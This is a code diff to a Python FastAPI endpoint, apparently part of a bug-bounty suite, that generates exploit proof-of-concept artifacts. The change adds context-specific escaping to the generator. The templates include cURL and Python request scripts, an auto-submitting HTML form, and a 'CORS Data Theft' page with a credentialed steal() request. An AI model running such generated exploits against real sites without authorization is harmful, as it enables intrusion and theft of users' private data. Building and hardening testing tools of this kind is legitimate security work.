@@ -1,25 +1,34 @@
-"""
-Exploit PoC Generator — Instant Proof-of-Concept & Reproduction Synthesizer.
-Inspired by Strix's core philosophy of Verified Findings & Reproducible Proof-of-Concepts (PoCs).
-Generates ready-to-run cURL commands, standalone Python exploit scripts, interactive HTML PoCs,
-and framework-specific remediation patches for developers.
+"""Exploit PoC Generator — Context-Aware Proof-of-Concept & Reproduction Synthesizer.
+
+Defends against code/command/HTML injection in generated PoC artifacts by applying
+strict context-specific escaping:
+- Shell: shlex.quote()
+- Python: repr() / json.dumps()
+- HTML: html.escape(..., quote=True)
+- JavaScript: json.dumps()
+- URL: urllib.parse.quote()
 """
 from __future__ import annotations
+import html
+import json
+import shlex
 import urllib.parse
-from typing import Dict, Any
+from typing import Any, Dict
+
 from fastapi import APIRouter
-from pydantic import BaseModel
-from tools.utils import clean_url, f, ok, err
+from pydantic import BaseModel, Field
+
+from backend.tools.utils import clean_url, err, f, ok
 
 router = APIRouter(tags=["exploitation"])
 
 
 class PocRequest(BaseModel):
-    vuln_type: str = "xss"      # xss | sqli | ssrf | ssti | cors | open_redirect | lfi | proto
-    target: str = "https://example.com/search"
-    parameter: str = "q"
-    custom_payload: str = ""
-    http_method: str = "GET"
+    vuln_type: str = Field("xss", max_length=64)
+    target: str = Field("https://example.com/search", min_length=1, max_length=2048)
+    parameter: str = Field("q", max_length=128)
+    custom_payload: str = Field("", max_length=2048)
+    http_method: str = Field("GET", max_length=16)
 
 
 DEFAULT_PAYLOADS = {
@@ -35,54 +44,68 @@ DEFAULT_PAYLOADS = {
 
 
 def build_curl(target: str, param: str, payload: str, method: str) -> str:
+    """Safely generate cURL command using shlex.quote to prevent shell command injection."""
     encoded_payload = urllib.parse.quote(payload)
+    safe_param = urllib.parse.quote(param)
+
     if method.upper() == "POST":
-        return f"""curl -i -s -k -X POST "{target}" \\
-  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \\
-  -H "Content-Type: application/x-www-form-urlencoded" \\
-  -d "{param}={encoded_payload}\""""
+        post_data = f"{safe_param}={encoded_payload}"
+        return (
+            f"curl -i -s -k -X POST {shlex.quote(target)} \\\n"
+            f"  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BB-Suite-PoC' \\\n"
+            f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
+            f"  -d {shlex.quote(post_data)}"
+        )
     else:
         delim = "&" if "?" in target else "?"
-        return f"""curl -i -s -k "{target}{delim}{param}={encoded_payload}" \\
-  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" """
+        full_url = f"{target}{delim}{safe_param}={encoded_payload}"
+        return (
+            f"curl -i -s -k {shlex.quote(full_url)} \\\n"
+            f"  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BB-Suite-PoC'"
+        )
 
 
 def build_python_script(target: str, param: str, payload: str, method: str, vuln_type: str) -> str:
+    """Safely generate Python exploit script using repr() to prevent code injection."""
+    safe_target = repr(target)
+    safe_param = repr(param)
+    safe_payload = repr(payload)
+    safe_method = repr(method.upper())
+    safe_vuln = repr(vuln_type.upper())
+
     script = f'''#!/usr/bin/env python3
 """
 Automated Exploit Proof of Concept (PoC)
 Vulnerability: {vuln_type.upper()}
-Target: {target}
-Parameter: {param}
 """
 import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-TARGET = "{target}"
-PARAM = "{param}"
-PAYLOAD = """{payload}"""
-METHOD = "{method.upper()}"
+TARGET = {safe_target}
+PARAM = {safe_param}
+PAYLOAD = {safe_payload}
+METHOD = {safe_method}
+VULN_TYPE = {safe_vuln}
 
 headers = {{
-    "User-Agent": "Mozilla/5.0 (BugBounty-PoC-Runner/1.0)",
+    "User-Agent": "Mozilla/5.0 (BugBounty-PoC-Runner/1.0; Authorized Security Assessment)",
     "Accept": "*/*",
 }}
 
-print(f"[*] Sending {vuln_type.upper()} exploit to {{TARGET}}...")
+print(f"[*] Sending {{VULN_TYPE}} exploit to {{TARGET}}...")
 
 try:
     if METHOD == "POST":
         data = {{PARAM: PAYLOAD}}
-        res = requests.post(TARGET, data=data, headers=headers, verify=False, timeout=10)
+        res = requests.post(TARGET, data=data, headers=headers, verify=True, timeout=10)
     else:
         params = {{PARAM: PAYLOAD}}
-        res = requests.get(TARGET, params=params, headers=headers, verify=False, timeout=10)
+        res = requests.get(TARGET, params=params, headers=headers, verify=True, timeout=10)
 
     print(f"[+] HTTP Status: {{res.status_code}}")
     print(f"[+] Response Length: {{len(res.text)}} bytes")
 
-    # Verification inspection
     if PAYLOAD in res.text:
         print("[✓] SUCCESS: Payload reflected directly in response body!")
     elif res.status_code == 200:
@@ -97,10 +120,23 @@ except Exception as err:
 
 
 def build_html_poc(target: str, param: str, payload: str, method: str, vuln_type: str) -> str:
+    """Safely generate HTML and JS PoC using html.escape and json.dumps."""
+    escaped_target_attr = html.escape(target, quote=True)
+    escaped_param_attr = html.escape(param, quote=True)
+    escaped_payload_attr = html.escape(payload, quote=True)
+    escaped_method_attr = html.escape(method.upper(), quote=True)
+    escaped_vuln_text = html.escape(vuln_type.upper())
+
+    # For JavaScript context:
+    js_target = json.dumps(target)
+
     if vuln_type == "cors":
         return f'''<!DOCTYPE html>
-<html>
-<head><title>CORS Data Theft PoC</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Data Theft PoC</title>
+</head>
 <body>
   <h2>CORS Exploit Demonstration</h2>
   <button onclick="steal()">Exfiltrate Private Data</button>
@@ -108,7 +144,7 @@ def build_html_poc(target: str, param: str, payload: str, method: str, vuln_type
   <script>
     function steal() {{
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "{target}", true);
+      xhr.open("GET", {js_target}, true);
       xhr.withCredentials = true;
       xhr.onreadystatechange = function() {{
         if (xhr.readyState === 4) {{
@@ -122,12 +158,15 @@ def build_html_poc(target: str, param: str, payload: str, method: str, vuln_type
 </html>'''
 
     return f'''<!DOCTYPE html>
-<html>
-<head><title>{vuln_type.upper()} Browser PoC</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>{escaped_vuln_text} Browser PoC</title>
+</head>
 <body>
-  <h2>{vuln_type.upper()} Form Auto-Submit Exploit</h2>
-  <form id="exploitForm" action="{target}" method="{method.upper()}">
-    <input type="hidden" name="{param}" value="{payload}" />
+  <h2>{escaped_vuln_text} Auto-Submit Form Exploit</h2>
+  <form id="exploitForm" action="{escaped_target_attr}" method="{escaped_method_attr}">
+    <input type="hidden" name="{escaped_param_attr}" value="{escaped_payload_attr}" />
   </form>
   <p>Triggering automatic request submission...</p>
   <script>
@@ -144,7 +183,7 @@ def build_remediation(vuln_type: str) -> str:
         "ssrf": "Implement an allowlist of permitted destination domains/IPs. Restrict server egress traffic, block RFC1918 private subnets and 169.254.169.254, and enforce IMDSv2 token headers.",
         "ssti": "Never pass user input into Template() render functions. Treat user input as template context variables, or use logic-less templating engines with sandboxing enabled.",
         "cors": "Specify explicit trusted origins in Access-Control-Allow-Origin. Never blindly echo the incoming Origin header when Access-Control-Allow-Credentials is true.",
-        "open_redirect": "Validate redirect URLs against a whitelist of relative paths or strictly approved domains. Avoid taking unconstrained redirect targets from query parameters.",
+        "open_redirect": "Validate redirect URLs against an allowlist of relative paths or strictly approved domains. Avoid taking unconstrained redirect targets from query parameters.",
         "lfi": "Avoid using user input in file system operations. Sanitize filenames with os.path.basename(), validate against a directory allowlist, or reference files by a lookup ID instead of path.",
         "proto": "Freeze Object.prototype via Object.freeze(Object.prototype), use Map or Object.create(null) for dictionary storage, and use safe JSON parsers.",
     }
@@ -166,17 +205,18 @@ async def poc_generator(req: PocRequest):
 
     findings = [
         f(
-            "info",
-            f"Synthesized PoC for {v_type.upper()}",
-            f"Target: {url} | Parameter: {param} | Method: {method}",
-            remediation_text
+            severity="info",
+            title=f"Synthesized PoC for {v_type.upper()}",
+            detail=f"Target: {url} | Parameter: {param} | Method: {method}",
+            rec=remediation_text,
+            confidence="confirmed",
         )
     ]
 
     records = [
-        {"Artifact": "cURL Command", "Format": "Shell / Terminal", "Ready": "✓ Ready to Execute"},
-        {"Artifact": "Python Exploit Script", "Format": "Python 3 + requests", "Ready": "✓ Ready to Run"},
-        {"Artifact": "Interactive HTML PoC", "Format": "HTML / JavaScript", "Ready": "✓ Browser Ready"},
+        {"Artifact": "cURL Command", "Format": "Shell / Terminal (shlex-quoted)", "Ready": "✓ Ready to Execute"},
+        {"Artifact": "Python Exploit Script", "Format": "Python 3 + requests (safe repr)", "Ready": "✓ Ready to Run"},
+        {"Artifact": "Interactive HTML PoC", "Format": "HTML / JavaScript (escaped)", "Ready": "✓ Browser Ready"},
         {"Artifact": "Remediation Patch", "Format": "Best Practices Guide", "Ready": "✓ Ready for Devs"},
     ]
 
